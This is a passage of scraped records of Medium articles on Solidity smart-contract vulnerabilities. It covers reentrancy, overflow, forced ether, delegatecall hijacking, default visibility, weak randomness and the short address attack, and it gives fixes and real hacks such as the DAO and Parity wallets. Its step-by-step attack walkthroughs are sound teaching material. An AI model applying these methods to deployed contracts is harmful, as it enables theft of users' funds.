balance being below a certain amount, that statement can be potentially bypassed:Due to the throwing fallback function, normally the contract cannot receive ether. However, if a contract selfdestructs with this contract as a target, the fallback function does not get called. As a result this.balance becomes greater than 0, and thus the attacker can bypass the require statement in onlyNonZeroBalanceMitigation: Never use a contract\u2019s balance as a guard.5. Call to the Unknown (DoS with unexpected revert)This vulnerability appeared in the King of the Ether smart contract.In this case, an attacker\u2019s contract could first claim leadership by sending enough ether to the insecure contract. Then, the transactions of another player who would attempt to claim leadership would throw due to line 25 in the above snippet.Although a simple attack, this causes a permanent denial of service to the contract rendering it useless. This can be found in other ponzi scheme contracts that follow the same pattern.6. Short Address AttackThis attack was discovered by the Golem team and described in this article. This vulnerability allows an attacker to abuse the transfer function and withdraw a larger amount of ERC20 tokens than he is allowed to.Note: For simplicity we\u2019ll use words half the normal size.To explain this bug let\u2019s consider an exchange having a wallet with 10000 tokens and a user with a balance of 32 tokens on that exchange\u2019s wallet. Let\u2019s also consider that this user\u2019s address is0x12345600 \u2014 notice the trailing zeroes \u2014 and that they want to withdraw an amount larger than their balance. To do that they would go to the exchange and click the token\u2019s withdraw button and input their address without the trailing zeroes (the exchange does not perform input validation and allows the transaction to go through, even though the attacker\u2019s address length is invalid).Then, the EVM calculates the input data for the transaction to be executed by concatenating the function\u2019s signature and the arguments.The ERC20\u2019s transfer function is formulated as transfer(address to, uint256 amount). The 3 fields would be as follows:sig : a9059cbb = web3.sha3(\"transfer(address,uint256)\").slice(0,10)arg1: 123456   = receiving addressarg2: 00000020  = 32 in hexademical (0x20)----------------------------------------Concatenated: a9059cbb 123456 00000020Transaction input data: 0xa9059cbb12345600000020The vulnerabilityLooking closely, the transaction\u2019s length is 2 bytes shorter (4 bytes in the real world with full words). The EVM in this case would pad the transaction with trailing zeroes, resulting in:0xa9059cbb1234560000002000// a9059cbb = web3.sha3(\"transfer(address,uint256)\").slice(0,10)// 12345600   = receiving address// 00002000  = 8192 in hexademical (0x2000 == 0x20<<8)That way, even though the attacker\u2019s balance according to the exchange is 32 tokens, they are able to execute a perfectly legitimate transfer for an amount that is much larger. This of course relies on the fact that the sending account (the exchange\u2019s wallet) has enough balance for the transfer.Mitigations:Throw if msg.data has invalid sizeExchanges must perform input validationReddit comment describing validating msg.data sizeBonus:ALWAYS avoid the use of now and block.blockhash for your contract\u2019s business logic as their results are predictable or can be manipulated by miners. More on that here.What can I do towards securing my Smart Contracts?This has been mentioned in many places, my personal favorite being here.Among others, my most important picks are:Don\u2019t write fancy codeUse audited and tested codeWrite as many unit tests as possibleWhat tools can I use to audit and analyze my code?First of all, solc performing semantic checking is a huge step towards security as potential mistakes get found at compilation time.Securify.ch is a static analysis tool for Smart Contracts.Remix also performs static analysis to your code and is able to spot bugs such as uninitialized storage pointers and reentrancy.Oyente is another recently announced analysis tool for Smart ContractsHydra is a \u201cframework for cryptoeconomic contract security, decentralized security bounties\u201dPorosity is a \u201cdecompiler for Blockchain-based Ethereum Smart-Contracts\u201dManticore is a dynamic binary analysis tool with EVM supportEthersplay is a Binary Ninja plugin for EVMFinally, visualizing your code by using tools such as solgraph can help you find potential bugs regarding functions\u2019 visibility.https://github.com/raineorshine/solgraphNote: Devcon3 Day 2 was filled with contract security talks, I definitely recommend watching them [1,2].For a more in-depth read on attacks on smart contracts refer to:The Underhanded Solidity Contest [1,2,3]Trailofbits/not-so-smart-contractsA survey of attacks on Ethereum Smart ContractsSmart contract best practices \u2014 Known attacksOnward with Smart Contract SecurityYou can practice your Smart Contract hacking skills at:Ethernaut (requires ropsten testnet account)HackThisContract (requires rinkeby testnet account)Loom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 3, "tags": ["Ethereum", "Security", "Hacking", "Smart Contract", "Blockchain"]}, {"title": "HackPedia: 16 Solidity Hacks/Vulnerabilities, their Fixes and Real World Examples", "post_link": "https://medium.com/hackernoon/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148?source=search_post", "author_name": "vasa", "author_link": "https://medium.com/@vaibhavsaini_67863", "publish_date": "2018-07-23", "last_modified_date": "2019-07-22", "readtime": "52.8", "claps": 1237, "voters": 123, "content": "HackPedia: 16 Solidity Hacks/Vulnerabilities, their Fixes and Real World ExamplesA Complete List of all Solidity Hacks/Vulnerabilities, their Fixes and Real World Hack ExamplesvasaFollowJul 23, 2018 \u00b7 53 min readThis blog was written by Dr. Adrian Manning in this SigmaPrime Blog.Although in its infancy, Solidity has had widespread adoption and is used to compile the byte-code in many Ethereum smart contracts we see today. There have been a number of harsh lessons learned by developers and users alike in discovering the nuances of the language and the EVM. This post aims to be a relatively in-depth and up-to-date introductory post detailing the past mistakes that have been made by Solidity developers in an effort to prevent future devs from repeating history.Here are 16 interesting hacks:1. Re-EntrancyOne of the features of Ethereum smart contracts is the ability to call and utilise code of other external contracts. Contracts also typically handle ether, and as such often send ether to various external user addresses. The operation of calling external contracts, or sending ether to an address, requires the contract to submit an external call. These external calls can be hijacked by attackers whereby they force the contract to execute further code (i.e. through a fallback function) , including calls back into itself. Thus the code execution \u201cre-enters\u201d the contract. Attacks of this kind were used in the infamous DAO hack.For further reading on re-entrancy attacks, see Reentrancy Attack On Smart Contracts and Consensus \u2014 Ethereum Smart Contract Best Practices.The VulnerabilityThis attack can occur when a contract sends ether to an unknown address. An attacker can carefully construct a contract at an external address which contains malicious code in the fallback function. Thus, when a contract sends ether to this address, it will invoke the malicious code. Typically the malicious code executes a function on the vulnerable contract, performing operations not expected by the developer. The name \u201cre-entrancy\u201d comes from the fact that the external malicious contract calls back a function on the vulnerable contract and \u201cre-enters\u201d code execution at an arbitrary location on the vulnerable contract.To clarify this, consider the simple vulnerable contract, which acts as an Ethereum vault that allows depositors to only withdraw 1 ether per week.EtherStore.solThis contract has two public functions. depositFunds() and withdrawFunds(). The depositFunds() function simply increments the senders balances. The withdrawFunds() function allows the sender to specify the amount of wei to withdraw. It will only succeed if the requested amount to withdraw is less than 1 ether and a withdrawal hasn't occurred in the last week. Or does it?...The vulnerability comes on line [17] where we send the user their requested amount of ether. Consider a malicious attacker creating the following contract,Attack.solLet us see how this malicious contract can exploit our EtherStore contract. The attacker would create the above contract (let's say at the address 0x0...123) with the EtherStore's contract address as the constructor parameter. This will initialize and point the public variable etherStore to the contract we wish to attack.The attacker would then call the pwnEtherStore() function, with some amount of ether (greater than or equal to 1), lets say 1 ether for this example. In this example we assume a number of other users have deposited ether into this contract, such that it's current balance is 10 ether. The following would then occur:Attack.sol \u2014 Line [15] \u2014 The depositFunds() function of the EtherStore contract will be called with a msg.value of 1 ether (and a lot of gas). The sender (msg.sender) will be our malicious contract (0x0...123). Thus, balances[0x0..123] = 1 ether.Attack.sol \u2014 Line [17] \u2014 The malicious contract will then call the withdrawFunds() function of the EtherStore contract with a parameter of 1 ether. This will pass all the requirements (Lines [12]-[16] of the EtherStore contract) as we have made no previous withdrawals.EtherStore.sol \u2014 Line [17] \u2014 The contract will then send 1 ether back to the malicious contract.Attack.sol \u2014 Line [25] \u2014 The ether sent to the malicious contract will then execute the fallback function.Attack.sol \u2014 Line [26] \u2014 The total balance of the EtherStore contract was 10 ether and is now 9 ether so this if statement passes.Attack.sol \u2014 Line [27] \u2014 The fallback function then calls the EtherStore withdrawFunds() function again and \"re-enters\" the EtherStore contract.EtherStore.sol \u2014 Line [11] \u2014 In this second call to withdrawFunds(), our balance is still 1 ether as line [18] has not yet been executed. Thus, we still have balances[0x0..123] = 1 ether. This is also the case for the lastWithdrawTimevariable. Again, we pass all the requirements.EtherStore.sol \u2014 Line [17] \u2014 We withdraw another 1 ether.Steps 4\u20138 will repeat \u2014 until EtherStore.balance >= 1 as dictated by line [26] in Attack.sol.Attack.sol \u2014 Line [26] \u2014 Once there less 1 (or less) ether left in the EtherStore contract, this if statement will fail. This will then allow lines [18] and [19] of the EtherStore contract to be executed (for each call to the withdrawFunds() function).EtherStore.sol \u2014 Lines [18] and [19] \u2014 The balances and lastWithdrawTime mappings will be set and the execution will end.The final result, is that the attacker has withdrawn all (bar 1) ether from the EtherStore contract, instantaneously with a single transaction.Preventative TechniquesThere are a number of common techniques which help avoid potential re-entrancy vulnerabilities in smart contracts. The first is to ( whenever possible) use the built-in transfer() function when sending ether to external contracts. The transfer function only sends 2300 gas which isn't enough for the destination address/contract to call another contract (i.e. re-enter the sending contract).The second technique is to ensure that all logic that changes state variables happen before ether is sent out of the contract (or any external call). In the EtherStore example, lines [18] and [19] of EtherStore.sol should be put before line [17]. It is good practice to place any code that performs external calls to unknown addresses as the last operation in a localised function or piece of code execution. This is known as the checks-effects-interactions pattern.A third technique is to introduce a mutex. That is, to add a state variable which locks the contract during code execution, preventing reentrancy calls.Applying all of these techniques (all three are unnecessary, but is done for demonstrative purposes) to EtherStore.sol, gives the re-entrancy-free contract:Real-World Example: The DAOThe DAO (Decentralized Autonomous Organization) was one of the major hacks that occurred in the early development of Ethereum. At the time, the contract held over $150 million USD. Re-entrancy played a major role in the attack which ultimately lead to the hard-fork that created Ethereum Classic (ETC). For a good analysis of the DAO exploit, see Phil Daian\u2019s post.2. Arithmetic Over/Under FlowsThe Ethereum Virtual Machine (EVM) specifies fixed-size data types for integers. This means that an integer variable, only has a certain range of numbers it can represent. A uint8 for example, can only store numbers in the range [0,255]. Trying to store 256 into a uint8 will result in 0. If care is not taken, variables in Solidity can be exploited if user input is unchecked and calculations are performed which result in numbers that lie outside the range of the data type that stores them.For further reading on arithmetic over/under flows, see How to Secure Your Smart Contracts, Ethereum Smart Contract Best Practices and Ethereum, Solidity and integer overflows: programming blockchains like 1970The VulnerabilityAn over/under flow occurs when an operation is performed that requires a fixed size variable to store a number (or piece of data) that is outside the range of the variable\u2019s data type.For example, subtracting 1 from a uint8 (unsigned integer of 8 bits, i.e. only positive) variable that stores 0 as it's value, will result in the number 255. This is an underflow. We have assigned a number below the range of the uint8, the result wraps around and gives the largest number a uint8 can store. Similarly, adding 2^8=256 to a uint8 will leave the variable unchanged as we have wrapped around the entire length of the uint (for the mathematicians, this is similar to adding $2\\pi$ to the angle of a trigonometric function, $\\sin(x) = \\sin(x+2\\pi)$). Adding numbers larger than the data type's range is called an overflow. For clarity, adding 257 to a uint8 that currently has a zero value will result in the number 1. It's sometimes instructive to think of fixed type variables being cyclic, where we start again from zero if we add numbers above the largest possible stored number, and vice-versa for zero (where we start counting down from the largest number the more we subtract from 0).These kinds of vulnerabilities allow attackers to misuse code and create unexpected logic flows. For example, consider the time locking contract below.TimeLock.solThis contract is designed to act like a time vault, where users can deposit ether into the contract and it will be locked there for at least a week. The user may extend the time longer than 1 week if they choose, but once deposited, the user can be sure their ether is locked in safely for at least a week. Or can they?\u2026In the event a user is forced to hand over their private key (think hostage situation) a contract such as this may be handy to ensure ether is unobtainable in short periods of time. If a user had locked in 100 ether in this contract and handed their keys over to an attacker, an attacker could use an overflow to receive the ether, regardless of the lockTime.The attacker could determine the current lockTime for the address they now hold the key for (its a public variable). Let's call this userLockTime. They could then call the increaseLockTime function and pass as an argument the number 2^256 - userLockTime. This number would be added to the current userLockTime and cause an overflow, resetting lockTime[msg.sender] to 0. The attacker could then simply call the withdraw function to obtain their reward.Let\u2019s look at another example, this one from the Ethernaut Challanges.SPOILER ALERT: If you\u2019ve not yet done the Ethernaut challenges, this gives a solution to one of the levels.This is a simple token contract which employs a transfer() function, allowing participants to move their tokens around. Can you see the error in this contract?The flaw comes in the transfer() function. The require statement on line [13] can be bypassed using an underflow. Consider a user that has no balance. They could call the transfer() function with any non-zero _value and pass the require statement on line [13]. This is because balances[msg.sender] is zero (and a uint256) so subtracting any positive amount (excluding 2^256) will result in a positive number due to the underflow we described above. This is also true for line [14], where our balance will be credited with a positive number. Thus, in this example, we have achieved free tokens due to an underflow vulnerability.Preventative TechniquesThe (currently) conventional technique to guard against under/overflow vulnerabilities is to use or build mathematical libraries which replace the standard math operators; addition, subtraction and multiplication (division is excluded as it doesn\u2019t cause over/under flows and the EVM throws on division by 0).OppenZepplin have done a great job in building and auditing secure libraries which can be leveraged by the Ethereum community. In particular, their Safe Math Library is a reference or library to use to avoid under/over flow vulnerabilities.To demonstrate how these libraries are used in Solidity, let us correct the TimeLock contract, using Open Zepplin's SafeMathlibrary. The over flow-free contract would become:Notice that all standard math operations have been replaced by the those defined in the SafeMath library. The TimeLockcontract no longer performs any operation which is capable of doing an under/over flow.Real-World Examples: PoWHC and Batch Transfer Overflow (CVE-2018\u201310299)A 4chan group decided it was a great idea to build a ponzi scheme on Ethereum, written in Solidity. They called it the Proof of Weak Hands Coin (PoWHC). Unfortunately it seems that the author(s) of the contract hadn\u2019t seen over/under flows before and consequently, 866 ether was liberated from its contract. A good overview of how the underflow occurs (which is not too dissimilar to the Ethernaut challenge above) is given in Eric Banisadar\u2019s post.Some developers also implemented a batchTransfer() function into some ERC20 token contracts. The implementation contained an overflow. This post explains it, however I think the title is misleading, in that it has nothing to do with the ERC20 standard, rather some ERC20 token contracts have a vulnerable batchTransfer() function implemented.3. Unexpected EtherTypically when ether is sent to a contract, it must execute either the fallback function, or another function described in the contract. There are two exceptions to this, where ether can exist in a contract without having executed any code. Contracts which rely on code execution for every ether sent to the contract can be vulnerable to attacks where ether is forcibly sent to a contract.For further reading on this, see How to Secure Your Smart Contracts: 6 and Solidity security patterns \u2014 forcing ether to a contract .The VulnerabilityA common defensive programming technique that is useful in enforcing correct state transitions or validating operations is invariant-checking. This technique involves defining a set of invariants (metrics or parameters that should not change) and checking these invariants remain unchanged after a single (or many) operation(s). This is typically good design, provided the invariants being checked are in fact invariants. One example of an invariant is the totalSupply of a fixed issuance ERC20token. As no functions should modify this invariant, one could add a check to the transfer() function that ensures the totalSupply remains unmodified to ensure the function is working as expected.There is one apparent \u201cinvariant\u201d, in particular, that may tempt developers to use, but can in fact be manipulated by external users, regardless of the rules put in place in the smart contract. This is the current ether stored in the contract. Often, when developers first learn Solidity, they have the misconception that a contract can only accept or obtain ether via payable functions. This misconception can lead to contracts that have false assumptions about the ether balance within them which can lead to a range of vulnerabilities. The smoking gun for this vulnerability is the (incorrect) use of this.balance. As we will see, incorrect uses of this.balance can lead to serious vulnerabilities of this type.There are two ways in which ether can (forcibly) be sent to a contract without using a payable function or executing any code on the contract. These are listed below.Self Destruct / SuicideAny contract is able to implement the selfdestruct(address) function, which removes all bytecode from the contract address and sends all ether stored there to the parameter-specified address. If this specified address is also a contract, no functions (including the fallback) get called. Therefore, the selfdestruct() function can be used to forcibly send ether to any contract regardless of any code that may exist in the contract. This is inclusive of contracts without any payable functions. This means, any attacker can create a contract with a selfdestruct() function, send ether to it, call selfdestruct(target) and force ether to be sent to a target contract. Martin Swende has an excellent blog post describing some quirks of the self-destruct opcode (Quirk #2) along with a description of how client nodes were checking incorrect invariants which could have lead to a rather catastrophic nuking of clients.Pre-sent EtherThe second way a contract can obtain ether without using a selfdestruct() function or calling any payable functions is to pre-load the contract address with ether. Contract addresses are deterministic, in fact the address is calculated from the hash of the address creating the contract and the transaction nonce which creates the contract. i.e. of the form: address = sha3(rlp.encode([account_address,transaction_nonce])) (see Keyless Ether for some fun use cases of this). This means, anyone can calculate what a contract address will be before it is created and thus send ether to that address. When the contract does get created it will have a non-zero ether balance.Let\u2019s explore some pitfalls that can arise given the above knowledge.Consider the overly-simple contract,EtherGame.solThis contract represents a simple game (which would naturally invoke race-conditions) whereby players send 0.5 etherquanta to the contract in hope to be the player that reaches one of three milestones first. Milestone's are denominated in ether. The first to reach the milestone may claim a portion of the ether when the game has ended. The game ends when the final milestone (10 ether) is reached and users can claim their rewards.The issues with the EtherGame contract come from the poor use of this.balance in both lines [14] (and by association [16]) and [32]. A mischievous attacker could forcibly send a small amount of ether, let's say 0.1 ether via the selfdestruct()function (discussed above) to prevent any future players from reaching a milestone. As all legitimate players can only send 0.5 ether increments, this.balance would no longer be half integer numbers, as it would also have the 0.1 ethercontribution. This prevents all the if conditions on lines [18], [21] and [24] from being true.Even worse, a vengeful attacker who missed a milestone, could forcibly send 10 ether (or an equivalent amount of ether that pushes the contract's balance above the finalMileStone) which would lock all rewards in the contract forever. This is because the claimReward() function will always revert, due to the require on line [32] (i.e. this.balance is greater than finalMileStone).Preventative TechniquesThis vulnerability typically arises from the misuse of this.balance. Contract logic, when possible, should avoid being dependent on exact values of the balance of the contract because it can be artificially manipulated. If applying logic based on this.balance, ensure to account for unexpected balances.If exact values of deposited ether are required, a self-defined variable should be used that gets incremented in payable functions, to safely track the deposited ether. This variable will not be influenced by the forced ether sent via a selfdestruct() call.With this in mind, a corrected version of the EtherGame contract could look like:Here, we have just created a new variable, depositedEther which keeps track of the known ether deposited, and it is this variable to which we perform our requirements and tests. Notice, that we no longer have any reference to this.balance.Real-World Example: UnknownI\u2019m yet to find and example of this that has been exploited in the wild. However, a few examples of exploitable contracts were given in the Underhanded Solidity Contest.4. DelegatecallThe CALL and DELEGATECALL opcodes are useful in allowing Ethereum developers to modularise their code. Standard external message calls to contracts are handled by the CALL opcode whereby code is run in the context of the external contract/function. The DELEGATECALL opcode is identical to the standard message call, except that the code executed at the targeted address is run in the context of the calling contract along with the fact that msg.sender and msg.value remain unchanged. This feature enables the implementation of libraries whereby developers can create reusable code for future contracts.Although the differences between these two opcodes are simple and intuitive, the use of DELEGATECALL can lead to unexpected code execution.For further reading, see Ethereum Stack Exchange Question, Solidity Docs and How to Secure Your Smart Contracts: 6.The VulnerabilityThe context preserving nature of DELEGATECALL has proved that building vulnerability-free custom libraries is not as easy as one might think. The code in libraries themselves can be secure and vulnerability-free however when run in the context of another application new vulnerabilities can arise. Let's see a fairly complex example of this, using Fibonacci numbers.Consider the following library which can generate the Fibonacci sequence and sequences of similar form.FibonacciLib.sol (This code was modified from web3j)This library provides a function which can generate the n-th Fibonacci number in the sequence. It allows users to change the 0-th start number and calculate the n-th Fibonacci-like numbers in this new sequence.Let\u2019s now consider a contract that utilises this library.FibonacciBalance.solThis contract allows a participant to withdraw ether from the contract, with the amount of ether being equal to the Fibonacci number corresponding to the participants withdrawal order; i.e., the first participant gets 1 ether, the second also gets 1, the third gets 2, the forth gets 3, the fifth 5 and so on (until the balance of the contract is less than the Fibonacci number being withdrawn).There are a number of elements in this contract that may require some explanation. Firstly, there is an interesting-looking variable, fibSig. This holds the first 4 bytes of the Keccak (SHA-3) hash of the string \"fibonacci(uint256)\". This is known as the function selector and is put into calldata to specify which function of a smart contract will be called. It is used in the delegatecall function on line [21] to specify that we wish to run the fibonacci(uint256) function. The second argument in delegatecall is the parameter we are passing to the function. Secondly, we assume that the address for the FibonacciLiblibrary is correctly referenced in the constructor (section Deployment Attack Vectors discuss some potential vulnerabilities relating to this kind if contract reference initialisation).Can you spot any error(s) in this contract? If you put this into remix, fill it with ether and call withdraw(), it will likely revert.You may have noticed that the state variable start is used in both the library and the main calling contract. In the library contract, start is used to specify the beginning of the Fibonacci sequence and is set to 0, whereas it is set to 3 in the FibonacciBalance contract. You may also have noticed that the fallback function in the FibonacciBalance contract allows all calls to be passed to the library contract, which allows for the setStart() function of the library contract to be called also. Recalling that we preserve the state of the contract, it may seem that this function would allow you to change the state of the start variable in the local FibonnacciBalance contract. If so, this would allow one to withdraw more ether, as the resulting calculatedFibNumber is dependent on the start variable (as seen in the library contract). In actual fact, the setStart()function does not (and cannot) modify the start variable in the FibonacciBalance contract. The underlying vulnerability in this contract is significantly worse than just modifying the start variable.Before discussing the actual issue, we take a quick detour to understanding how state variables (storage variables) actually get stored in contracts. State or storage variables (variables that persist over individual transactions) are placed into slotssequentially as they are introduced in the contract. (There are some complexities here, and I encourage the reader to read Layout of State Variables in Storage for a more thorough understanding).As an example, let\u2019s look at the library contract. It has two state variables, start and calculatedFibNumber. The first variable is start, as such it gets stored into the contract's storage at slot[0] (i.e. the first slot). The second variable, calculatedFibNumber, gets placed in the next available storage slot, slot[1]. If we look at the function setStart(), it takes an input and sets start to whatever the input was. This function is therefore setting slot[0] to whatever input we provide in the setStart() function. Similarly, the setFibonacci() function sets calculatedFibNumber to the result of fibonacci(n). Again, this is simply setting storage slot[1] to the value of fibonacci(n).Now lets look at the FibonacciBalance contract. Storage slot[0] now corresponds to fibonacciLibrary address and slot[1] corresponds to calculatedFibNumber. It is here where the vulnerability appears. delegatecall preserves contract context. This means that code that is executed via delegatecall will act on the state (i.e. storage) of the calling contract.Now notice that in withdraw() on line [21] we execute, fibonacciLibrary.delegatecall(fibSig,withdrawalCounter). This calls the setFibonacci() function, which as we discussed, modifies storage slot[1], which in our current context is calculatedFibNumber. This is as expected (i.e. after execution, calculatedFibNumber gets adjusted). However, recall that the start variable in the FibonacciLib contract is located in storage slot[0], which is the fibonacciLibrary address in the current contract. This means that the function fibonacci() will give an unexpected result. This is because it references start (slot[0]) which in the current calling context is the fibonacciLibrary address (which will often be quite large, when interpreted as a uint). Thus it is likely that the withdraw() function will revert as it will not contain uint(fibonacciLibrary) amount of ether, which is what calcultedFibNumber will return.Even worse, the FibonacciBalance contract allows users to call all of the fibonacciLibrary functions via the fallback function on line [26]. As we discussed earlier, this includes the setStart() function. We discussed that this function allows anyone to modify or set storage slot[0]. In this case, storage slot[0] is the fibonacciLibrary address. Therefore, an attacker could create a malicious contract (an example of one is below), convert the address to a uint (this can be done in python easily using int('<address>',16)) and then call setStart(<attack_contract_address_as_uint>). This will change fibonacciLibrary to the address of the attack contract. Then, whenever a user calls withdraw() or the fallback function, the malicious contract will run (which can steal the entire balance of the contract) because we've modified the actual address for fibonacciLibrary. An example of such an attack contract would be,Notice that this attack contract modifies the calculatedFibNumber by changing storage slot[1]. In principle, an attacker could modify any other storage slots they choose to perform all kinds of attacks on this contract. I encourage all readers to put these contracts into Remix and experiment with different attack contracts and state changes through these delegatecallfunctions.It is also important to notice that when we say that delegatecall is state-preserving, we are not talking about the variable names of the contract, rather the actual storage slots to which those names point. As you can see from this example, a simple mistake, can lead to an attacker hijacking the entire contract and its ether.Preventative TechniquesSolidity provides the library keyword for implementing library contracts (see the Solidity Docs for further details). This ensures the library contract is stateless and non-self-destructable. Forcing libraries to be stateless mitigates the complexities of storage context demonstrated in this section. Stateless libraries also prevent attacks whereby attackers modify the state of the library directly in order to effect the contracts that depend on the library's code. As a general rule of thumb, when using DELEGATECALL pay careful attention to the possible calling context of both the library contract and the calling contract, and whenever possible, build state-less libraries.Real-World Example: Parity Multisig Wallet (Second Hack)The Second Parity Multisig Wallet hack is an example of how the context of well-written library code can be exploited if run in its non-intended context. There are a number of good explanations of this hack, such as this overview: Parity MultiSig Hacked. Again by Anthony Akentiev, this stack exchange question and An In-Depth Look at the Parity Multisig Bug.To add to these references, let\u2019s explore the contracts that were exploited. The library and wallet contract can be found on the parity github here.Let\u2019s look at the relevant aspects of this contract. There are two contracts of interest contained here, the library contract and the wallet contract.The library contract,and the wallet contract,Notice that the Wallet contract essentially passes all calls to the WalletLibrary contract via a delegate call. The constant _walletLibrary address in this code snippet acts as a placeholder for the actually deployed WalletLibrary contract (which was at 0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4).The intended operation of these contracts was to have a simple low-cost deployable Wallet contract whose code base and main functionality was in the WalletLibrary contract. Unfortunately, the WalletLibrary contract is itself a contract and maintains it's own state. Can you see why this might be an issue?It is possible to send calls to the WalletLibrary contract itself. Specifically, the WalletLibrary contract could be initialised, and become owned. A user did this, by calling initWallet() function on the WalletLibrary contract, becoming an owner of the library contract. The same user, subsequently called the kill() function. Because the user was an owner of the Library contract, the modifier passed and the library contract suicided. As all Wallet contracts in existence refer to this library contract and contain no method to change this reference, all of their functionality, including the ability to withdraw ether is lost along with the WalletLibrary contract. More directly, all ether in all parity multi-sig wallets of this type instantly become lost or permanently unrecoverable.5. Default VisibilitiesFunctions in Solidity have visibility specifiers which dictate how functions are allowed to be called. The visibility determines whether a function can be called externally by users, by other derived contracts, only internally or only externally. There are four visibility specifiers, which are described in detail in the Solidity Docs. Functions default to public allowing users to call them externally. Incorrect use of visibility specifiers can lead to some devestating vulernabilities in smart contracts as will be discussed in this section.The VulnerabilityThe default visibility for functions is public. Therefore functions that do not specify any visibility will be callable by external users. The issue comes when developers mistakenly ignore visibility specifiers on functions which should be private (or only callable within the contract itself).Lets quickly explore a trivial example.This simple contract is designed to act as an address guessing bounty game. To win the balance of the contract, a user must generate an Ethereum address whose last 8 hex characters are 0. Once obtained, they can call the WithdrawWinnings()function to obtain their bounty.Unfortunately, the visibility of the functions have not been specified. In particular, the _sendWinnings() function is publicand thus any address can call this function to steal the bounty.Preventative TechniquesIt is good practice to always specify the visibility of all functions in a contract, even if they are intentionally public. Recent versions of Solidity will now show warnings during compilation for functions that have no explicit visibility set, to help encourage this practice.Real-World Example: Parity MultiSig Wallet (First Hack)In the first Parity multi-sig hack, about $31M worth of Ether was stolen from primarily three wallets. A good recap of exactly how this was done is given by Haseeb Qureshi in this post.Essentially, the multi-sig wallet (which can be found here) is constructed from a base Wallet contract which calls a library contract containing the core functionality (as was described in Real-World Example: Parity Multisig (Second Hack)). The library contract contains the code to initialise the wallet as can be seen from the following snippetNotice that neither of the functions have explicitly specified a visibility. Both functions default to public. The initWallet()function is called in the wallets constructor and sets the owners for the multi-sig wallet as can be seen in the initMultiowned() function. Because these functions were accidentally left public, an attacker was able to call these functions on deployed contracts, resetting the ownership to the attackers address. Being the owner, the attacker then drained the wallets of all their ether, to the tune of $31M.6. Entropy IllusionAll transactions on the Ethereum blockchain are deterministic state transition operations. Meaning that every transaction modifies the global state of the Ethereum ecosystem and it does so in a calculable way with no uncertainty. This ultimately means that inside the blockchain ecosystem there is no source of entropy or randomness. There is no rand() function in Solidity. Achieving decentralised entropy (randomness) is a well established problem and many ideas have been proposed to address this (see for example, RandDAO or using a chain of Hashes as described by Vitalik in this post).The VulnerabilitySome of the first contracts built on the Ethereum platform were based around gambling. Fundamentally, gambling requires uncertainty (something to bet on), which makes building a gambling system on the blockchain (a deterministic system) rather difficult. It is clear that the uncertainty must come from a source external to the blockchain. This is possible for bets amongst peers (see for example the commit-reveal technique), however, it is significantly more difficult if you want to implement a contract to act as the house (like in blackjack our roulette). A common pitfall is to use future block variables, such as hashes, timestamps, blocknumber or gas limit. The issue with these are that they are controlled by the miner who mines the block and as such are not truly random. Consider, for example, a roulette smart contract with logic that returns a black number if the next block hash ends in an even number. A miner (or miner pool) could bet \\$1M on black. If they solve the next block and find the hash ends in an odd number, they would happily not publish their block and mine another until they find a solution with the block hash being an even number (assuming the block reward and fees are less than $1M). Using past or present variables can be even more devastating as Martin Swende demonstrates in his excellent blog post. Furthermore, using solely block variables mean that the pseudo-random number will be the same for all transactions in a block, so an attacker can multiply their wins by doing many transactions within a block (should there be a maximum bet).Preventative TechniquesThe source of entropy (randomness) must be external to the blockchain. This can be done amongst peers with systems such as commit-reveal, or via changing the trust model to a group of participants (such as in RandDAO). This can also be done via a centralised entity, which acts as a randomness oracle. Block variables (in general, there are some exceptions) should not be used to source entropy as they can be manipulated by miners.Real-World Example: PRNG ContractsArseny Reutov wrote a blog post after he analysed 3649 live smart contracts which were using some sort of pseudo random number generator (PRNG) and found 43 contracts which could be exploited. This post discusses the pitfalls of using block variables as entropy in further detail.7. External Contract ReferencingOne of the benefits of Ethereum global computer is the ability to re-use code and interact with contracts already deployed on the network. As a result, a large number of contracts reference external contracts and in general operation use external message calls to interact with these contracts. These external message calls can mask malicious actors intentions in some non-obvious ways, which we will discuss.The VulnerabilityIn Solidity, any address can be cast as a contract regardless of whether the code at the address represents the contract type being cast. This can be deceiving, especially when the author of the contract is trying to hide malicious code. Let us illustrate this with an example:Consider a piece of code which rudimentarily implements the Rot13 cipher.Rot13Encryption.solThis code simply takes a string (letters a-z, without validation) and encrypts it by shifting each character 13 places to the right (wrapping around \u2018z\u2019); i.e. \u2018a\u2019 shifts to \u2019n\u2019 and \u2018x\u2019 shifts to \u2018k\u2019. The assembly in here is not important, so don\u2019t worry if it doesn\u2019t make any sense at this stage.Consider the following contract which uses this code for its encryptionThe issue with this contract is that the encryptionLibrary address is not public or constant. Thus the deployer of the contract could have given an address in the constructor which points to this contract:which implements the rot26 cipher (shifts each character by 26 places, get it? :p). Again, thre is no need to understand the assembly in this contract. The deployer could have also linked the following contract:If the address of either of these contracts were given in the constructor, the encryptPrivateData() function would simply produce an event which prints the unencrypted private data. Although in this example a library-like contract was set in the constructor, it is often the case that a privileged user (such as an owner) can change library contract addresses. If a linked contract doesn't contain the function being called, the fallback function will execute. For example, with the line encryptionLibrary.rot13Encrypt(), if the contract specified by encryptionLibrary was:then an event with the text \u201cHere\u201d would be emitted. Thus if users can alter contract libraries, they can in principle get users to unknowingly run arbitrary code.Note: Don\u2019t use encryption contracts such as these, as the input parameters to smart contracts are visible on the blockchain. Also the Rot cipher is not a recommended encryption technique :pPreventative TechniquesAs demonstrated above, vulnerability free contracts can (in some cases) be deployed in such a way that they behave maliciously. An auditor could publicly verify a contract and have it\u2019s owner deploy it in a malicious way, resulting in a publicly audited contract which has vulnerabilities or malicious intent.There are a number of techniques which prevent these scenarios.One technique, is to use the new keyword to create contracts. In the example above, the constructor could be written like:constructor() {        encryptionLibrary = new Rot13Encryption();    }This way an instance of the referenced contract is created at deployment time and the deployer cannot replace the Rot13Encryption contract with anything else without modifying the smart contract.Another solution is to hard code any external contract addresses if they are known.In general, code that calls external contracts should always be looked at carefully. As a developer, when defining external contracts, it can be a good idea to make the contract addresses public (which is not the case in the honey-pot example) to allow users to easily examine which code is being referenced by the contract. Conversely, if a contract has a private variable contract address it can be a sign of someone behaving maliciously (as shown in the real-world example). If a privileged (or any) 